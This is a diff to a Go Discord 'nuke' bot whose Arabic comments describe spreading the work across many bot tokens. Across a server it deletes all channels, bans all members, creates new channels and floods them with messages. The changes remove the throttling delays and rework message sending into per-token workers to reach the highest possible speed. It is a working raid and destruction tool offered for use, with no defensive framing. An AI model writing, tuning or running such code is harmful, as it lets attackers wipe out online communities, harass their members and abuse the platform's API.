@@ -43,7 +43,7 @@ func main() {
 	cmdNuke := "nuke"
 	commandNuke := &discordgo.ApplicationCommand{
 		Name:        cmdNuke,
-		Description: "nuke server",
+		Description: "nuke server1",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -98,7 +98,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "⚡ جاري تنفيذ العمليات بالسرعات والراحة المحددة...",
+					Content: "⚡ جاري تنفيذ العمليات بالسرعة القصوى والتوزيع الذكي...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -137,7 +137,7 @@ func main() {
 	}
 
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
-	fmt.Println("🤖 بوت السرعات المخصصة شغال وجاهز!")
+	fmt.Println("🤖 بوت السرعات القصوى شغال وجاهز!")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -208,7 +208,7 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 
 	time.Sleep(1 * time.Second)
 
-	// أ. حذف الرومات القديمة (20 جزء من الثانية بين كل روم)
+	// أ. حذف الرومات القديمة
 	var wgDel sync.WaitGroup
 	for idx, id := range oldChannelIDs {
 		wgDel.Add(1)
@@ -231,9 +231,9 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 					retryAfterStr := resp.Header.Get("Retry-After")
 					resp.Body.Close()
 					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
-						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
+						time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 50*time.Millisecond)
 					} else {
-						time.Sleep(50 * time.Millisecond)
+						time.Sleep(100 * time.Millisecond)
 					}
 					continue
 				}
@@ -241,11 +241,10 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 				break
 			}
 		}(id, idx)
-		time.Sleep(10 * time.Millisecond)
 	}
 	wgDel.Wait()
 
-	// ب. حظر الأعضاء (مع راحة 100 ميلي ثانية لكل 1000 عضو)
+	// ب. حظر الأعضاء
 	var wgBan sync.WaitGroup
 	for idx, userID := range allUserIDs {
 		wgBan.Add(1)
@@ -268,9 +267,9 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 					retryAfterStr := resp.Header.Get("Retry-After")
 					resp.Body.Close()
 					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
-						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
+						time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 50*time.Millisecond)
 					} else {
-						time.Sleep(50 * time.Millisecond)
+						time.Sleep(100 * time.Millisecond)
 					}
 					continue
 				}
@@ -278,15 +277,10 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 				break
 			}
 		}(userID, idx)
-
-		// تطبيق الراحة (100 ميلي ثانية) لكل 1000 عضو يتم معالجتهم
-		if (idx+1)%1000 == 0 {
-			time.Sleep(70 * time.Millisecond)
-		}
 	}
 	wgBan.Wait()
 
-	// ج. إنشاء الرومات الجديدة (20 جزء من الثانية بين كل روم)
+	// ج. إنشاء الرومات الجديدة
 	var newChannelIDs []string
 	var muChannels sync.Mutex
 	var wgCreate sync.WaitGroup
@@ -311,9 +305,9 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 					retryAfterStr := resp.Header.Get("Retry-After")
 					resp.Body.Close()
 					if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
-						time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
+						time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 50*time.Millisecond)
 					} else {
-						time.Sleep(50 * time.Millisecond)
+						time.Sleep(100 * time.Millisecond)
 					}
 					continue
 				}
@@ -332,48 +326,59 @@ func executeDistributedNuke(tokens []string, guildID, botID, roomName string, ro
 				break
 			}
 		}(payload, idx)
-		time.Sleep(10 * time.Millisecond)
 	}
 	wgCreate.Wait()
 
-	// د. إرسال الرسائل (10 أجزاء من الثانية بين كل رسالة)
+	// د. إرسال الرسائل (باستخدام نظام العمال المستقلين لكل بوت لأقصى سرعة ممكنة وبدون تأخير)
 	var wgMsg sync.WaitGroup
-	for idx, chID := range newChannelIDs {
+	for botIdx, token := range tokens {
 		wgMsg.Add(1)
-		go func(chIDParam string, index int) {
+		go func(t string, bIndex int) {
 			defer wgMsg.Done()
-			headers := getHeaders(index)
 			
-			for m := 0; m < messagesCount; m++ {
-				for {
-					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
-					for k, v := range headers {
-						msgReq.Header.Set(k, v)
-					}
-
-					msgResp, err := httpClient.Do(msgReq)
-					if err != nil {
-						return
-					}
-
-					if msgResp.StatusCode == 429 {
-						retryAfterStr := msgResp.Header.Get("Retry-After")
-						msgResp.Body.Close()
-						if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
-							time.Sleep(time.Duration(retryAfter*1000) * time.Millisecond)
-						} else {
-							time.Sleep(50 * time.Millisecond)
-						}
-						continue
-					}
-					msgResp.Body.Close()
-					break
-				}
-				time.Sleep(5 * time.Millisecond)
+			botClient := &http.Client{
+				Timeout: 5 * time.Second,
 			}
-		}(chID, idx)
+
+			headers := map[string]string{
+				"Authorization": "Bot " + t,
+				"Content-Type":  "application/json",
+				"User-Agent":    "DiscordBot (https://discord.com, v10)",
+			}
+
+			for chIdx := bIndex; chIdx < len(newChannelIDs); chIdx += len(tokens) {
+				chIDParam := newChannelIDs[chIdx]
+
+				for m := 0; m < messagesCount; m++ {
+					for {
+						msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+chIDParam+"/messages", bytes.NewBuffer(msgPayload))
+						for k, v := range headers {
+							msgReq.Header.Set(k, v)
+						}
+
+						msgResp, err := botClient.Do(msgReq)
+						if err != nil {
+							break
+						}
+
+						if msgResp.StatusCode == 429 {
+							retryAfterStr := msgResp.Header.Get("Retry-After")
+							msgResp.Body.Close()
+							if retryAfter, err := strconv.ParseFloat(retryAfterStr, 64); err == nil {
+								time.Sleep(time.Duration(retryAfter*1000)*time.Millisecond + 20*time.Millisecond)
+							} else {
+								time.Sleep(50 * time.Millisecond)
+							}
+							continue
+						}
+						msgResp.Body.Close()
+						break
+					}
+				}
+			}
+		}(token, botIdx)
 	}
 	wgMsg.Wait()
 
-	fmt.Println("✅ انتهت كافة العمليات بالسرعات والراحة المحددة بنجاح!")
+	fmt.Println("✅ انتهت كافة العمليات بالسرعة القصوى بنجاح!")
 }
